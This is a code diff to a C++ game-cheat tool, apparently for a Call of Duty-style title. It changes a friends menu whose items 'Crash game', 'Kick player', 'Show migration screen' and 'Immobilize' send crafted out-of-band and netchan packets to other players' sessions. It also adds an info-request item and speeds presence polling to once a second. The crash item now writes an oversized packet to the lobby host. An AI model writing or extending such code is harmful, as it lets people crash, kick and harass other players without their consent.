@@ -100,7 +100,7 @@ namespace friends
 			
 			pending_task->xuids = task.first.data();
 			pending_task->count = static_cast<int>(task.first.size());
-			pending_task->infos = reinterpret_cast<game::bdRichPresenceInfo*>(game::base_address + 0x113C8650);
+			pending_task->infos = reinterpret_cast<game::bdRichPresenceInfo*>(OFFSET(0x7FF6D66A9650));
 			pending_task->successCallback = presence_update_success_callback;
 			pending_task->failureCallback = presence_update_failure_callback;
 
@@ -132,7 +132,18 @@ namespace friends
 			static std::vector<std::uint64_t> recipients{};
 
 			if (recipients.empty())
-				for (const auto& f : friends) recipients.emplace_back(f.steam_id);
+			{
+				for (auto& f : friends)
+				{
+					if (f.is_online() && std::time(nullptr) - f.last_online > 15)
+					{
+						f.response.info_response = {};
+						friends::write();
+					}
+					
+					recipients.emplace_back(f.steam_id);
+				}
+			}
 
 			if (recipients.empty())
 				return;
@@ -140,7 +151,7 @@ namespace friends
 			if (pending_task)
 				return;
 
-			constexpr auto interval{ 10s };
+			constexpr auto interval{ 1s };
 			const auto now{ std::chrono::high_resolution_clock::now() };
 			static std::chrono::high_resolution_clock::time_point last_time{};
 
@@ -324,6 +335,13 @@ namespace friends
 
 						ImGui::EndMenu();
 					}
+
+					ImGui::Separator();
+
+					if (ImGui::MenuItem("Send info request"))
+					{
+						events::instant_message::send_info_request(f.steam_id, friends::NONCE);
+					}
 					
 					ImGui::Separator();
 
@@ -337,6 +355,7 @@ namespace friends
 					const auto info_response = response.info_response;
 					const auto party_session = info_response.lobby[0];
 					const auto lobby_session = info_response.lobby[1];
+					game::netadr_t party_netadr{}, lobby_netadr{};
 					
 					if (party_session.isValid)
 					{
@@ -359,6 +378,8 @@ namespace friends
 
 							ImGui::EndMenu();
 						}
+
+						party_netadr = game::net::oob::register_remote_addr(party_session);
 					}
 
 					if (lobby_session.isValid && lobby_session.hostXuid != f.steam_id)
@@ -369,6 +390,8 @@ namespace friends
 						{
 							game::connect_to_session(game::HostInfo{}.from_lobby(lobby_session));
 						}
+
+						lobby_netadr = game::net::oob::register_remote_addr(lobby_session);
 					}
 
 					if (const auto start_up_time{ presence.title.startupTimestamp }; start_up_time)
@@ -387,30 +410,31 @@ namespace friends
 
 					ImGui::Separator();
 					
-					game::netadr_t netadr{};
-					game::net::oob::register_remote_addr(game::HostInfo{}.from_lobby(party_session), &netadr);
-					const auto status = game::call<game::bdDTLSAssociationStatus>(game::base_address + 0x143BAB0, &netadr);
-
-					const auto is_ready{ f.is_online() && status == game::BD_SOCKET_CONNECTED };
+					const auto is_ready{ f.is_online() && game::dwGetConnectionStatus(&party_netadr) == game::BD_SOCKET_CONNECTED };
 
 					if (ImGui::MenuItem("Crash game", nullptr, nullptr, is_ready))
 					{
-						exploit::send_crash(netadr);
+						//exploit::send_crash(party_netadr);
+
+						if (game::dwGetConnectionStatus(&lobby_netadr) == game::BD_SOCKET_CONNECTED)
+						{
+							game::net::netchan::write({ 0, 0, 0x10000 }, lobby_netadr, lobby_session.hostXuid, f.steam_id, false);
+						}
 					}
 
 					if (ImGui::MenuItem("Kick player", nullptr, nullptr, is_ready))
 					{
-						exploit::send_connect_response_migration_packet(netadr);
+						exploit::send_connect_response_migration_packet(party_netadr);
 					}
 
 					if (ImGui::MenuItem("Show migration screen", nullptr, nullptr, is_ready))
 					{
-						exploit::send_mstart_packet(netadr);
+						exploit::send_mstart_packet(party_netadr);
 					}
 
 					if (ImGui::MenuItem("Immobilize", nullptr, nullptr, is_ready))
 					{
-						exploit::send_request_stats_packet(netadr);
+						exploit::send_request_stats_packet(party_netadr);
 					}
 
 					if (ImGui::BeginMenu("Send OOB##" + xuid, is_ready))
@@ -421,7 +445,7 @@ namespace friends
 
 						if (ImGui::MenuItem("Send OOB", nullptr, nullptr, !oob_input.empty()))
 						{
-							game::net::oob::send(netadr, oob_input);
+							game::net::oob::send(party_netadr, oob_input);
 						}
 
 						ImGui::EndMenu();
